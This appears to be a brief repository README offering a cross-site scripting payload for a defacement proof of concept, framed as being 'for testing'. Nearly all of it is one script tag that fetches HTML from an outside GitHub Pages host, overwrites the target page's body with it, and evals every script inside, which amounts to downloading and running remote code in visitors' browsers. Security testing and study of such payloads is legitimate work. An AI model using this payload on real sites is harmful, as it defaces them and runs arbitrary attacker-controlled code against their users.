#  This is my Deface page for PoC
use the following paylods for testing .
```
<script> fetch('https://karthikdude.github.io/Deface/') .then(response => response.text()) .then(html => { document.body.innerHTML = html; const scripts = document.body.getElementsByTagName('script'); for (let script of scripts) { eval(script.innerText); } }); </script>
